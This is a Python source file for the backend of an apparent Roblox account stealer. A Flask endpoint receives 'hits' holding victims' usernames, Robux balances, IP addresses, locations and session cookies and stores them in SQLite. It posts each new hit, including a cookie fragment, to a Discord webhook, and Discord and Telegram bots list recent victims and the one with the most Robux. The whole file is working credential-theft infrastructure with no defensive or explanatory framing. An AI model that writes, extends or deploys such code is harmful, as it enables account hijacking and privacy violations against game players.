import sys
import json
import sqlite3
import threading
import time
import requests
from datetime import datetime
from flask import Flask, request, jsonify

# ---------- CONFIG (Set these via Render environment variables) ----------
import os

DISCORD_TOKEN = os.environ.get("DISCORD_TOKEN", "YOUR_DISCORD_BOT_TOKEN")
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "-5330491816")
ENABLE_TELEGRAM = True if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID else False
DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "")  # optional
API_TOKEN = os.environ.get("API_TOKEN", "123")

DB_FILE = "hits.db"

# ---------- Database ----------
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS hits (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TEXT, username TEXT, robux INTEGER,
                    premium TEXT, ip TEXT, location TEXT, cookie TEXT, raw_data TEXT
                )''')
    conn.commit()
    conn.close()

def add_hit(data):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''INSERT INTO hits (timestamp, username, robux, premium, ip, location, cookie, raw_data)
                 VALUES (?,?,?,?,?,?,?,?)''',
              (data['timestamp'], data['username'], data['robux'], data['premium'],
               data['ip'], data['location'], data['cookie'], json.dumps(data)))
    conn.commit()
    conn.close()

def get_all_hits():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('SELECT id, timestamp, username, robux, premium, ip, location, cookie FROM hits ORDER BY id DESC')
    rows = c.fetchall()
    conn.close()
    return [{'id':r[0], 'timestamp':r[1], 'username':r[2], 'robux':r[3],
             'premium':r[4], 'ip':r[5], 'location':r[6], 'cookie':r[7][:30]+'...'} for r in rows]

def get_total_hits():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('SELECT COUNT(*) FROM hits')
    count = c.fetchone()[0]
    conn.close()
    return count

def get_top_robux():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('SELECT username, robux FROM hits ORDER BY robux DESC LIMIT 1')
    row = c.fetchone()
    conn.close()
    return row if row else (None, 0)

# ---------- Discord Webhook (hit notification) ----------
def send_discord_webhook(hit):
    if not DISCORD_WEBHOOK_URL:
        return
    try:
        from discord_webhook import DiscordWebhook, DiscordEmbed
        webhook = DiscordWebhook(url=DISCORD_WEBHOOK_URL)
        embed = DiscordEmbed(title="🎯 New Hit!", color=0x00ff00)
        embed.add_embed_field(name="Username", value=hit.get('username', 'N/A'))
        embed.add_embed_field(name="Robux", value=hit.get('robux', 0))
        embed.add_embed_field(name="IP", value=hit.get('ip', 'N/A'))
        embed.add_embed_field(name="Location", value=hit.get('location', 'N/A'))
        embed.add_embed_field(name="Cookie", value=f"```{hit.get('cookie', 'N/A')[:50]}...```")
        embed.set_timestamp()
        webhook.add_embed(embed)
        webhook.execute()
    except Exception as e:
        print(f"[Webhook] Error: {e}")

# ---------- Flask Server ----------
app = Flask(__name__)

@app.route('/log_hit', methods=['POST'])
def log_hit():
    data = request.get_json()
    if not data:
        return jsonify({"error": "No JSON"}), 400
    if 'timestamp' not in data:
        data['timestamp'] = datetime.now().isoformat()
    add_hit(data)
    threading.Thread(target=send_discord_webhook, args=(data,)).start()
    return jsonify({"status": "ok"}), 200

@app.route('/get_hits', methods=['GET'])
def get_hits():
    auth = request.headers.get('X-Auth-Token')
    if auth != API_TOKEN:
        return jsonify({"error": "Unauthorized"}), 401
    return jsonify(get_all_hits())

@app.route('/total', methods=['GET'])
def total():
    auth = request.headers.get('X-Auth-Token')
    if auth != API_TOKEN:
        return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"total": get_total_hits()})

@app.route('/top', methods=['GET'])
def top():
    auth = request.headers.get('X-Auth-Token')
    if auth != API_TOKEN:
        return jsonify({"error": "Unauthorized"}), 401
    user, robux = get_top_robux()
    return jsonify({"username": user, "robux": robux})

# ---------- Discord Bot ----------
def run_discord_bot():
    import discord
    from discord.ext import commands

    intents = discord.Intents.default()
    intents.message_content = True
    bot = commands.Bot(command_prefix='/', intents=intents)

    @bot.event
    async def on_ready():
        print(f'[Discord] Logged in as {bot.user}')

    @bot.command(name='howmanyhits')
    async def how_many_hits(ctx):
        try:
            resp = requests.get(f"http://127.0.0.1:5000/get_hits",
                                headers={"X-Auth-Token": API_TOKEN}, timeout=10)
            if resp.status_code != 200:
                await ctx.send("Error fetching hits.")
                return
            hits = resp.json()
            if not hits:
                await ctx.send("No hits yet.")
                return
            total = len(hits)
            display = hits[:10]
            lines = [f"**Total hits: {total}**"]
            for h in display:
                lines.append(f"`{h['timestamp']}` | **{h['username']}** | {h['robux']} R$ | {h['ip']} | {h['location']}")
            if total > 10:
                lines.append(f"... and {total - 10} more.")
            await ctx.send("\n".join(lines))
        except Exception as e:
            await ctx.send(f"Error: {e}")

    @bot.command(name='total')
    async def total_hits(ctx):
        try:
            resp = requests.get(f"http://127.0.0.1:5000/total",
                                headers={"X-Auth-Token": API_TOKEN}, timeout=10)
            if resp.status_code != 200:
                await ctx.send("Error fetching total.")
                return
            data = resp.json()
            await ctx.send(f"**Total hits recorded:** {data['total']}")
        except Exception as e:
            await ctx.send(f"Error: {e}")

    @bot.command(name='top')
    async def top_robux(ctx):
        try:
            resp = requests.get(f"http://127.0.0.1:5000/top",
                                headers={"X-Auth-Token": API_TOKEN}, timeout=10)
            if resp.status_code != 200:
                await ctx.send("Error fetching top hit.")
                return
            data = resp.json()
            if data['username']:
                await ctx.send(f"**Highest Robux:** {data['username']} with {data['robux']} R$")
            else:
                await ctx.send("No hits yet.")
        except Exception as e:
            await ctx.send(f"Error: {e}")

    @bot.command(name='help')
    async def help_cmd(ctx):
        help_text = """
**Available commands:**
`/howmanyhits` – Show 10 most recent hits
`/total` – Show total hit count
`/top` – Show hit with most Robux
`/help` – Show this message
"""
        await ctx.send(help_text)

    bot.run(DISCORD_TOKEN)

# ---------- Telegram Bot ----------
def run_telegram_bot():
    try:
        from telegram import Update
        from telegram.ext import Application, CommandHandler, ContextTypes

        async def how_many_hits(update: Update, context: ContextTypes.DEFAULT_TYPE):
            try:
                resp = requests.get(f"http://127.0.0.1:5000/get_hits",
                                    headers={"X-Auth-Token": API_TOKEN}, timeout=10)
                if resp.status_code != 200:
                    await update.message.reply_text("Error fetching hits.")
                    return
                hits = resp.json()
                if not hits:
                    await update.message.reply_text("No hits yet.")
                    return
                total = len(hits)
                display = hits[:10]
                lines = [f"Total hits: {total}"]
                for h in display:
                    lines.append(f"{h['timestamp']} | {h['username']} | {h['robux']} R$ | {h['ip']} | {h['location']}")
                if total > 10:
                    lines.append(f"... and {total - 10} more.")
                await update.message.reply_text("\n".join(lines))
            except Exception as e:
                await update.message.reply_text(f"Error: {e}")

        async def total_hits(update: Update, context: ContextTypes.DEFAULT_TYPE):
            try:
                resp = requests.get(f"http://127.0.0.1:5000/total",
                                    headers={"X-Auth-Token": API_TOKEN}, timeout=10)
                if resp.status_code != 200:
                    await update.message.reply_text("Error fetching total.")
                    return
                data = resp.json()
                await update.message.reply_text(f"Total hits recorded: {data['total']}")
            except Exception as e:
                await update.message.reply_text(f"Error: {e}")

        async def top_robux(update: Update, context: ContextTypes.DEFAULT_TYPE):
            try:
                resp = requests.get(f"http://127.0.0.1:5000/top",
                                    headers={"X-Auth-Token": API_TOKEN}, timeout=10)
                if resp.status_code != 200:
                    await update.message.reply_text("Error fetching top hit.")
                    return
                data = resp.json()
                if data['username']:
                    await update.message.reply_text(f"Highest Robux: {data['username']} with {data['robux']} R$")
                else:
                    await update.message.reply_text("No hits yet.")
            except Exception as e:
                await update.message.reply_text(f"Error: {e}")

        async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
            help_text = """Available commands:
/howmanyhits – Show 10 most recent hits
/total – Show total hit count
/top – Show hit with most Robux
/help – Show this message"""
            await update.message.reply_text(help_text)

        app_tele = Application.builder().token(TELEGRAM_TOKEN).build()
        app_tele.add_handler(CommandHandler("howmanyhits", how_many_hits))
        app_tele.add_handler(CommandHandler("total", total_hits))
        app_tele.add_handler(CommandHandler("top", top_robux))
        app_tele.add_handler(CommandHandler("help", help_cmd))
        print("[Telegram] Bot started polling.")
        app_tele.run_polling()
    except Exception as e:
        print(f"[Telegram] Error: {e}")

# ---------- Startup logic for Render (and local) ----------
def start_bots():
    # Give Flask a moment to start if we're on Render
    time.sleep(2)
    if DISCORD_TOKEN and DISCORD_TOKEN != "YOUR_DISCORD_BOT_TOKEN":
        threading.Thread(target=run_discord_bot, daemon=True).start()
    if ENABLE_TELEGRAM and TELEGRAM_TOKEN != "YOUR_TELEGRAM_BOT_TOKEN":
        threading.Thread(target=run_telegram_bot, daemon=True).start()

# ---------- Main ----------
if __name__ == "__main__":
    # Local development: run with --server to start Flask + bots
    if len(sys.argv) > 1 and sys.argv[1] == "--server":
        init_db()
        # Start Flask in a thread
        threading.Thread(target=app.run, kwargs={'host':'0.0.0.0','port':5000,'debug':False}, daemon=True).start()
        start_bots()
        # Keep main thread alive
        while True:
            time.sleep(1)
    else:
        # On Render, gunicorn will start Flask; we start bots after Flask loads
        # but we need to run them after app is ready. We'll start them at import time.
        # However, to avoid starting bots when gunicorn just imports (for workers), we check if we are in the main process.
        # For simplicity, we start bots here – gunicorn will run this code.
        print("Starting server (gunicorn) ...")
        init_db()
        start_bots()
        # gunicorn will run the app, no need to call app.run()